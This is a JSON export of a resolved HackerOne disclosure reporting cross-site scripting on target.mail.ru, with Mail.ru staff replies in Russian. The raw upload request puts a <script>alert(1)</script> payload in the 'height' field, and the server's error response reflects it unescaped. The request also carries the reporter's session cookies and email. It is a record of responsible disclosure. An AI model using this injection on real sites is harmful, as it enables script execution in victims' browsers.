{"id":19334,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTMzNA==","url":"https://hackerone.com/reports/19334","title":"target.mail.ru: XSS","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-07-07T11:12:45.691Z","submitted_at":"2014-07-07T11:12:45.691Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"isox","url":"/isox","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/006/507/53ee156fd5b0b3b9a7bbc254dad1b482e30537ff_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-09-13T12:04:12.975Z","bug_reporter_agreed_on_going_public_at":"2015-08-21T08:43:06.480Z","team_member_agreed_on_going_public_at":"2015-09-13T12:04:12.458Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"POST /ajax/upload_image/ HTTP/1.1\r\nHost: target.mail.ru\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://target.mail.ru/ads/create/\r\nCookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nE:; s=fver=14|s_vp=(2560/644)|dpr=1; i=AQCwdrpTBwATAAgfClwAATABAWQBAowBAY0BAY8BAZoBAdwEAvQEAQAGAV0ABQIBAKgACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAfbvAQgEAQEAAVgDCAQBAQAB; b=gT8IAHDFSAUADLHRYSgjITSiIoT7WZPQmyoSAgAAwraBSEiZMwnnDG4inNK0AnE6+0UC; searchuid=9987040291391447473; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAID3gcA; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; c=Rnu6UwEAQMvTAAATAQAA1zzyaAAAEAAA; Mpop=1404730173:517058034772616319050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; mc1=1404730203; csrftoken=0MCegI2csNuNjB5Spgrouw08VvazbdKl; z=uxz03smodbato19j4wepmbqd2f9p6bwr; last_read_news_id=0; notifytop1=070720143; mrBizPromoPanel=1\r\nConnection: keep-alive\r\nContent-Type: multipart/form-data; boundary=---------------------------15539954223049427401276649438\r\nContent-Length: 1342\r\n\r\n-----------------------------15539954223049427401276649438\r\nContent-Disposition: form-data; name=\"image_file\"; filename=\"1px.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nÿØÿà�\u0010JFIF�\u0001\u0001\u0001�`�`��ÿÛ�C�\b\u0006\u0006\u0007\u0006\u0005\b\u0007\u0007\u0007\t\t\b\r\n\f\u0014\r\n\f\u000b\u000b\f\u0019\u0012\u0013\u000f\u0014\u001d\u001a\u001f\u001e\u001d\u001a\u001c\u001c $.' \",#\u001c\u001c(7),01444\u001f'9=82\u003c.342ÿÛ�C\u0001\t\t\t\f\u000b\f\u0018\r\n\r\n\u00182!\u001c!22222222222222222222222222222222222222222222222222ÿÀ�\u0011\b�\u0001�\u0001\u0003\u0001\"�\u0002\u0011\u0001\u0003\u0011\u0001ÿÄ�\u0015�\u0001\u0001���������������\bÿÄ�\u0014\u0010\u0001����������������ÿÄ�\u0014\u0001\u0001����������������ÿÄ�\u0014\u0011\u0001����������������ÿÚ�\f\u0003\u0001�\u0002\u0011\u0003\u0011�?�À\u0007ÿÙ\r\n-----------------------------15539954223049427401276649438\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n1080\r\n-----------------------------15539954223049427401276649438\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n\u003cscript\u003ealert(1);\u003c/script\u003e\r\n-----------------------------15539954223049427401276649438\r\nContent-Disposition: form-data; name=\"max_height\"\r\n\r\n90\r\n-----------------------------15539954223049427401276649438\r\nContent-Disposition: form-data; name=\"max_width\"\r\n\r\n90\r\n-----------------------------15539954223049427401276649438\r\nContent-Disposition: form-data; name=\"min_height\"\r\n\r\n60\r\n-----------------------------15539954223049427401276649438\r\nContent-Disposition: form-data; name=\"min_width\"\r\n\r\n90\r\n-----------------------------15539954223049427401276649438\r\nContent-Disposition: form-data; name=\"rollover\"\r\n\r\nTrue\r\n-----------------------------15539954223049427401276649438--\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nHTTP/1.1 400 BAD REQUEST\r\nServer: nginx/1.2.8\r\nDate: Mon, 07 Jul 2014 11:11:25 GMT\r\nContent-Type: text/html; charset=utf-8\r\nConnection: keep-alive\r\nVary: Cookie\r\nSet-Cookie: last_read_news_id=0; expires=Mon, 14-Jul-2014 11:11:25 GMT; Max-Age=604800; Path=/\r\nContent-Length: 74\r\n\r\n\"{'height': u\\\"'\u003cscript\u003ealert(1);\u003c/script\u003e' is not type of int or long\\\"}\"\r\n\r\n\r\nВ фырфоксе отрабатывает ОК.\r\n","vulnerability_information_html":"\u003cp\u003ePOST /ajax/upload_image/ HTTP/1.1\u003cbr\u003e\nHost: target.mail.ru\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0\u003cbr\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,\u003cem\u003e/\u003c/em\u003e;q=0.8\u003cbr\u003e\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nReferer: \u003ca title=\"https://target.mail.ru/ads/create/\" href=\"/redirect?url=https%3A%2F%2Ftarget.mail.ru%2Fads%2Fcreate%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://target.mail.ru/ads/create/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nE:; s=fver=14|s_vp=(2560/644)|dpr=1; i=AQCwdrpTBwATAAgfClwAATABAWQBAowBAY0BAY8BAZoBAdwEAvQEAQAGAV0ABQIBAKgACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAfbvAQgEAQEAAVgDCAQBAQAB; b=gT8IAHDFSAUADLHRYSgjITSiIoT7WZPQmyoSAgAAwraBSEiZMwnnDG4inNK0AnE6+0UC; searchuid=9987040291391447473; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAID3gcA; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; c=Rnu6UwEAQMvTAAATAQAA1zzyaAAAEAAA; Mpop=1404730173:517058034772616319050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:\u003ca title=\"isox@inbox.ru\" href=\"mailto:isox@inbox.ru\" rel=\"nofollow noopener noreferrer\"\u003eisox@inbox.ru\u003c/a\u003e:; mc1=1404730203; csrftoken=0MCegI2csNuNjB5Spgrouw08VvazbdKl; z=uxz03smodbato19j4wepmbqd2f9p6bwr; last_read_news_id=0; notifytop1=070720143; mrBizPromoPanel=1\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nContent-Type: multipart/form-data; boundary=---------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Length: 1342\u003c/p\u003e\n\n\u003cp\u003e-----------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;image_file\u0026quot;; filename=\u0026quot;1px.jpg\u0026quot;\u003cbr\u003e\nContent-Type: image/jpeg\u003c/p\u003e\n\n\u003cp\u003eÿØÿà�JFIF��\u003ccode\u003e�\u003c/code\u003e��ÿÛ�C�       \u003cbr\u003e\n\u003cbr\u003e\n $.\u0026#39; \u0026quot;,#(7),01444\u0026#39;9=82\u0026lt;.342ÿÛ�C            \u003c/p\u003e\n\n\u003cp\u003e2!!22222222222222222222222222222222222222222222222222ÿÀ���\u0026quot;�ÿÄ�����������������ÿÄ�����������������ÿÄ�����������������ÿÄ�����������������ÿÚ���?�ÀÿÙ\u003cbr\u003e\n-----------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;width\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e1080\u003cbr\u003e\n-----------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;height\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u003cbr\u003e\n-----------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;max_height\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e90\u003cbr\u003e\n-----------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;max_width\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e90\u003cbr\u003e\n-----------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;min_height\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e60\u003cbr\u003e\n-----------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;min_width\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e90\u003cbr\u003e\n-----------------------------15539954223049427401276649438\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;rollover\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eTrue\u003cbr\u003e\n-----------------------------15539954223049427401276649438--\u003c/p\u003e\n\n\u003cp\u003eHTTP/1.1 400 BAD REQUEST\u003cbr\u003e\nServer: nginx/1.2.8\u003cbr\u003e\nDate: Mon, 07 Jul 2014 11:11:25 GMT\u003cbr\u003e\nContent-Type: text/html; charset=utf-8\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nVary: Cookie\u003cbr\u003e\nSet-Cookie: last_read_news_id=0; expires=Mon, 14-Jul-2014 11:11:25 GMT; Max-Age=604800; Path=/\u003cbr\u003e\nContent-Length: 74\u003c/p\u003e\n\n\u003cp\u003e\u0026quot;{\u0026#39;height\u0026#39;: u\\\u0026quot;\u0026#39;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#39; is not type of int or long\\\u0026quot;}\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eВ фырфоксе отрабатывает ОК.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-09-20T08:43:07.900Z","allow_singular_disclosure_after":-166478834.44532967,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":91090,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ping","markdown_message":"\u003cp\u003ePing\u003c/p\u003e\n","automated_response":false,"created_at":"2014-07-18T11:04:24.250Z","updated_at":"2014-07-18T11:04:24.250Z","actor":{"username":"isox","cleared":false,"url":"/isox","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/507/53ee156fd5b0b3b9a7bbc254dad1b482e30537ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":91093,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\n\nПрисланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.","markdown_message":"\u003cp\u003eСпасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\u003c/p\u003e\n\n\u003cp\u003eПрисланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-07-18T11:07:57.717Z","updated_at":"2014-07-18T11:07:57.717Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":106534,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Привет,\nмы пофиксили баг. Пожалуйста проверьте, что проблема больше не воспроизводится.\n\nК сожалению, баг не входит в область действия программы денежного вознаграждения за найденные уязвимости, но мы искренне признательны вам за то, что вы сообщили о нем и помогли нам стать чуть-чуть лучше.","markdown_message":"\u003cp\u003eПривет,\u003cbr\u003e\nмы пофиксили баг. Пожалуйста проверьте, что проблема больше не воспроизводится.\u003c/p\u003e\n\n\u003cp\u003eК сожалению, баг не входит в область действия программы денежного вознаграждения за найденные уязвимости, но мы искренне признательны вам за то, что вы сообщили о нем и помогли нам стать чуть-чуть лучше.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-13T11:10:50.302Z","updated_at":"2014-08-13T11:10:50.302Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"isox","url":"/isox"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":557200,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi! Just wanted to disclose my bugs.\nIf you think that this ticket must stay private - not a problem, I will cancel disclosure :)","markdown_message":"\u003cp\u003eHi! Just wanted to disclose my bugs.\u003cbr\u003e\nIf you think that this ticket must stay private - not a problem, I will cancel disclosure :)\u003c/p\u003e\n","automated_response":false,"created_at":"2015-08-21T08:43:06.508Z","updated_at":"2015-08-21T08:43:06.508Z","first_to_agree":true,"actor":{"username":"isox","cleared":false,"url":"/isox","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/507/53ee156fd5b0b3b9a7bbc254dad1b482e30537ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":586801,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-09-13T12:04:12.514Z","updated_at":"2015-09-13T12:04:12.514Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":586802,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-09-13T12:04:13.014Z","updated_at":"2015-09-13T12:04:13.014Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":716769,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2015-12-11T11:06:33.660Z","updated_at":"2015-12-11T11:06:33.660Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}